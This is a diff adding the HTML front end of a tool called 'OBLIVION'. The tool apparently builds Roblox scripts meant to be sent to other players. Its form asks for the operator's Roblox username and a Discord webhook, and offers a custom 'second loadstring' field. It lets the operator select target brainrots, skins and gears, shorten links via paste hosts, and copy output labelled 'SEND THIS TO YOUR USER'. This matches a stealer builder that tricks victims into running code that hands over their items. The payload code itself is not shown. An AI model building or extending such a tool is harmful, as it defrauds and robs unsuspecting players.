@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>OBLIVION</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <div id="app">
+        <header>
+            <h1>OBLIVION</h1>
+            <div class="header-glow"></div>
+        </header>
+
+        <!-- Username -->
+        <section class="input-section">
+            <label>ROBLOX USERNAME</label>
+            <input type="text" id="username" placeholder="Tu usuario" />
+        </section>
+
+        <!-- Webhook -->
+        <section class="input-section">
+            <label>DISCORD WEBHOOK</label>
+            <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." />
+        </section>
+
+        <!-- Execution Mode -->
+        <section class="mode-section">
+            <span class="mode-label">EXECUTION MODE</span>
+            <div class="mode-buttons">
+                <button id="modeNormal" class="mode-btn active">NORMAL</button>
+                <button id="modeCustom" class="mode-btn">CUSTOM</button>
+            </div>
+        </section>
+
+        <!-- Second Loadstring -->
+        <section id="secondLoadstring" class="hidden">
+            <label>SECOND LOADSTRING</label>
+            <textarea id="customLoadstring" rows="4" placeholder="Escribe tu código aquí..."></textarea>
+        </section>
+
+        <!-- Target Brainrots -->
+        <section class="target-section">
+            <div class="section-header">
+                <h2>TARGET BRAINROTS</h2>
+                <span class="counter" id="brainrotsCounter">0 SELECTED</span>
+            </div>
+            <div class="search-bar">
+                <input type="text" id="brainrotsSearch" placeholder="Search..." />
+                <button class="all-btn" id="brainrotsAll">ALL</button>
+                <button class="none-btn" id="brainrotsNone">NONE</button>
+            </div>
+            <div class="rarity-filters">
+                <button class="filter-btn active" data-rarity="all">ALL</button>
+                <button class="filter-btn" data-rarity="Common">Common</button>
+                <button class="filter-btn" data-rarity="Rare">Rare</button>
+                <button class="filter-btn" data-rarity="Epic">Epic</button>
+                <button class="filter-btn" data-rarity="Mythic">Mythic</button>
+                <button class="filter-btn" data-rarity="Legendary">Legendary</button>
+                <button class="filter-btn" data-rarity="Brainrot God">God</button>
+                <button class="filter-btn" data-rarity="Secret">Secret</button>
+                <button class="filter-btn" data-rarity="OG">OG</button>
+                <button class="filter-btn" data-rarity="Events">Events</button>
+                <button class="filter-btn" data-rarity="Recommended">⭐ Recommended</button>
+            </div>
+            <div class="items-container scrollable" id="brainrotsContainer"></div>
+        </section>
+
+        <!-- Target Base Skins -->
+        <section class="target-section">
+            <div class="section-header">
+                <h2>TARGET BASE SKINS</h2>
+                <span class="counter" id="skinsCounter">0 SELECTED</span>
+            </div>
+            <div class="search-bar">
+                <input type="text" id="skinsSearch" placeholder="Search..." />
+                <button class="all-btn" id="skinsAll">ALL</button>
+                <button class="none-btn" id="skinsNone">NONE</button>
+            </div>
+            <div class="items-container scrollable" id="skinsContainer"></div>
+        </section>
+
+        <!-- Target Gears -->
+        <section class="target-section">
+            <div class="section-header">
+                <h2>TARGET GEARS</h2>
+                <span class="counter" id="gearsCounter">0 SELECTED</span>
+            </div>
+            <div class="search-bar">
+                <input type="text" id="gearsSearch" placeholder="Search..." />
+                <button class="all-btn" id="gearsAll">ALL</button>
+                <button class="none-btn" id="gearsNone">NONE</button>
+            </div>
+            <div class="items-container scrollable" id="gearsContainer"></div>
+        </section>
+
+        <!-- Short Loadstring -->
+        <section class="short-loadstring-section">
+            <div class="short-header">
+                <div>
+                    <h2>SHORT LOADSTRING</h2>
+                    <p class="subtitle">USE TINY DATABASE LINK</p>
+                </div>
+                <div class="toggle-switch" id="shortToggle">
+                    <span class="toggle-label off">OFF</span>
+                    <div class="toggle-track">
+                        <span class="toggle-thumb"></span>
+                    </div>
+                </div>
+            </div>
+            <!-- Link Provider -->
+            <div id="linkProvider" class="link-provider hidden">
+                <label>LINK PROVIDER</label>
+                <div class="provider-buttons">
+                    <button class="provider-btn active" data-provider="pastefy">PASTEFY</button>
+                    <button class="provider-btn" data-provider="voidexternal">VOIDEXTERNAL</button>
+                    <button class="provider-btn" data-provider="rubis">RUBIS</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Generate Script -->
+        <button id="generateBtn">GENERATE SCRIPT</button>
+
+        <!-- Output Section (hidden initially) -->
+        <section id="outputSection" class="hidden">
+            <div class="output-header">
+                <h2>SEND THIS TO YOUR USER</h2>
+                <button id="copyBtn">COPY</button>
+            </div>
+            <div class="output-container">
+                <pre id="outputCode"></pre>
+            </div>
+        </section>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
